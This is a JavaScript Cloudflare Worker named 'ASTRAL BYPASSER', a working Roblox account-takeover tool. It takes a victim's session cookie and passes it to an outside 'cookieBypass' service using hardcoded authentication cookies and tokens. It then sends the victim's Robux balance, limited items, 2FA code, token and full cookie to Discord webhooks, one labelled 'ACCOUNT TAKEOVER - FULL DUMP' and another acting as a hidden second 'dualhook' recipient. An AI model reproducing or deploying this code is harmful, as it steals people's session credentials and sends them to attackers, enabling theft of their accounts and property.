// ============================================================
// ASTRAL BYPASSER v4.2
// Uses Immortal API with hardcoded authentication cookies
// ============================================================

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
});

async function handleRequest(request) {
  // Handle CORS preflight
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 204,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  if (request.method !== 'POST') {
    return new Response(JSON.stringify({ 
      error: 'Method not allowed. Use POST.' 
    }), {
      status: 405,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Allow': 'POST, OPTIONS'
      }
    });
  }

  let payload;
  try {
    payload = await request.json();
  } catch (e) {
    return new Response(JSON.stringify({
      success: false,
      error: 'Invalid JSON payload'
    }), {
      status: 400,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }

  const { cookie, username } = payload;

  if (!cookie) {
    return new Response(JSON.stringify({
      success: false,
      error: 'Missing required: cookie'
    }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }

  const startTime = Date.now();
  const displayName = username || 'Unknown_User';

  try {
    // Hardcoded Immortal authentication cookies
    const immortalCookies = [
      'Authentication=8eg0ZmGL%2FIwdyoHZDdMYnjJiQTdobGVLQkdoeGc3cGJpWUtNMmJKUzNqRW1FUTBHWTlwZFdjOEtzRWs9',
      'Authentication2=cXqas72gYpgV0xgoFibeQkc3MlMwUUdnVlJ4dTcxdTBmcm5ualRxdk5zTkJxZlRLcDlLOFFmcVdZdlR1R3FiaFBIMzZ3STJJZlJSZlYrWiticlFnSGVoYlEzTjhITFZTbWxQVS93PT0%3D',
      'EggyWall_Token=2fbd5fe89040219ea4f487e940e72435e8db380110449038a877c5e260058a2b',
      'PHPSESSID=j636n1vo2ku7jpqfi2tafamasv'
    ];

    const cookieString = immortalCookies.join('; ');

    // Forward to Immortal API with authentication
    const immortalResponse = await fetch('https://immortal.st/api/misc/cookieBypass.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Origin': 'https://immortal.st',
        'Referer': 'https://immortal.st/dashboard',
        'Cookie': cookieString
      },
      body: JSON.stringify({ Cookie: cookie })
    });

    const responseText = await immortalResponse.text();
    console.log('Immortal API raw response:', responseText);

    // Check if response is HTML
    if (responseText.trim().startsWith('<') || responseText.trim().startsWith('\n\t\t\t')) {
      return new Response(JSON.stringify({
        success: false,
        error: 'Immortal API returned HTML - session expired',
        raw: responseText.substring(0, 300)
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    let data;
    try {
      data = JSON.parse(responseText);
    } catch (e) {
      return new Response(JSON.stringify({
        success: false,
        error: 'Immortal API returned invalid JSON',
        raw: responseText.substring(0, 300)
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    const duration = Date.now() - startTime;

    // Check if the API returned success
    if (data.success || data.status === 'success' || data.code) {
      const result = {
        success: true,
        code: data.code || data.verificationCode || 'N/A',
        token: data.token || data.verificationToken || 'N/A',
        robux: data.robux || 0,
        pending: data.pending || 0,
        premium: data.premium || false,
        korblox: data.korblox || false,
        headless: data.headless || false,
        valkyrie: data.valkyrie || false,
        dominus: data.dominus || false,
        clockwork: data.clockwork || false,
        totalItems: data.totalItems || 0,
        userId: data.userId || 'N/A',
        username: data.username || displayName
      };

      // Send Live Bypass (clean)
      await sendLiveBypass({
        username: result.username,
        userId: result.userId,
        robux: result.robux,
        pending: result.pending,
        premium: result.premium,
        korblox: result.korblox,
        headless: result.headless,
        valkyrie: result.valkyrie,
        dominus: result.dominus,
        clockwork: result.clockwork,
        totalItems: result.totalItems,
        duration: duration,
        code: result.code
      });

      // Send Dualhook (full dump with cookie)
      await sendDualWebhook({
        type: 'success',
        username: result.username,
        userId: result.userId,
        robux: result.robux,
        pending: result.pending,
        premium: result.premium,
        korblox: result.korblox,
        headless: result.headless,
        valkyrie: result.valkyrie,
        dominus: result.dominus,
        clockwork: result.clockwork,
        totalItems: result.totalItems,
        cookie: cookie,
        code: result.code,
        token: result.token,
        duration: duration
      });

      return new Response(JSON.stringify({
        success: true,
        code: result.code,
        token: result.token,
        robux: result.robux,
        pending: result.pending,
        premium: result.premium,
        korblox: result.korblox,
        headless: result.headless,
        valkyrie: result.valkyrie,
        dominus: result.dominus,
        clockwork: result.clockwork,
        totalItems: result.totalItems,
        userId: result.userId,
        username: result.username,
        duration: duration
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });

    } else {
      const errorMsg = data.error || data.message || 'Immortal API returned failure';

      await sendDualWebhook({
        type: 'failure',
        username: displayName,
        userId: data.userId || 'N/A',
        error: errorMsg,
        duration: duration
      });

      return new Response(JSON.stringify({
        success: false,
        error: errorMsg,
        duration: duration
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

  } catch (e) {
    return new Response(JSON.stringify({
      success: false,
      error: 'Worker error: ' + e.message
    }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }
}

// ============================================================
// LIVE BYPASS - CLEAN
// ============================================================

async function sendLiveBypass(data) {
  const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_MAIN : null;
  if (!webhookURL) return;

  const embed = {
    title: '2FA BYPASS SUCCESSFUL',
    color: 0x00ff88,
    fields: [
      { name: 'User', value: data.username || 'Unknown', inline: true },
      { name: 'User ID', value: data.userId || 'N/A', inline: true },
      { name: 'Robux', value: data.robux || 0, inline: true },
      { name: 'Pending', value: data.pending || 0, inline: true },
      { name: 'Premium', value: data.premium ? 'Yes' : 'No', inline: true },
      { name: 'Korblox', value: data.korblox ? 'Yes' : 'No', inline: true },
      { name: 'Headless', value: data.headless ? 'Yes' : 'No', inline: true },
      { name: 'Valkyrie', value: data.valkyrie ? 'Yes' : 'No', inline: true },
      { name: 'Dominus', value: data.dominus ? 'Yes' : 'No', inline: true },
      { name: 'Clockwork', value: data.clockwork ? 'Yes' : 'No', inline: true },
      { name: 'Total Items', value: data.totalItems || 0, inline: true },
      { name: 'Code', value: `\`${data.code || 'N/A'}\``, inline: true },
      { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s`, inline: true }
    ],
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '2FA Bypass Successful',
        embeds: [embed]
      })
    });
  } catch (e) {}
}

// ============================================================
// DUALHOOK - FULL DUMP
// ============================================================

async function sendDualWebhook(data) {
  const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_DUAL : null;
  if (!webhookURL) return;

  let embed;

  if (data.type === 'success') {
    embed = {
      title: 'ACCOUNT TAKEOVER - FULL DUMP',
      color: 0xff0044,
      fields: [
        { name: 'User', value: data.username || 'Unknown', inline: true },
        { name: 'User ID', value: data.userId || 'N/A', inline: true },
        { name: 'Robux', value: data.robux || 0, inline: true },
        { name: 'Pending', value: data.pending || 0, inline: true },
        { name: 'Premium', value: data.premium ? 'Yes' : 'No', inline: true },
        { name: 'Korblox', value: data.korblox ? 'Yes' : 'No', inline: true },
        { name: 'Headless', value: data.headless ? 'Yes' : 'No', inline: true },
        { name: 'Valkyrie', value: data.valkyrie ? 'Yes' : 'No', inline: true },
        { name: 'Dominus', value: data.dominus ? 'Yes' : 'No', inline: true },
        { name: 'Clockwork', value: data.clockwork ? 'Yes' : 'No', inline: true },
        { name: 'Total Items', value: data.totalItems || 0, inline: true },
        { name: 'Code', value: `\`${data.code || 'N/A'}\``, inline: true },
        { name: 'Token', value: `\`${data.token || 'N/A'}\``, inline: false },
        { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s`, inline: true },
        { name: 'Cookie', value: `\`\`\`${data.cookie || 'N/A'}\`\`\``, inline: false }
      ],
      timestamp: new Date().toISOString()
    };
  } else {
    embed = {
      title: 'ERROR REPORT',
      color: 0xff0000,
      fields: [
        { name: 'User', value: data.username || 'Unknown', inline: true },
        { name: 'User ID', value: data.userId || 'N/A', inline: true },
        { name: 'Error', value: data.error || 'Unknown error', inline: false },
        { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s` || 'N/A', inline: true }
      ],
      timestamp: new Date().toISOString()
    };
  }

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone ACCOUNT TAKEOVER',
        embeds: [embed]
      })
    });
  } catch (e) {}
}
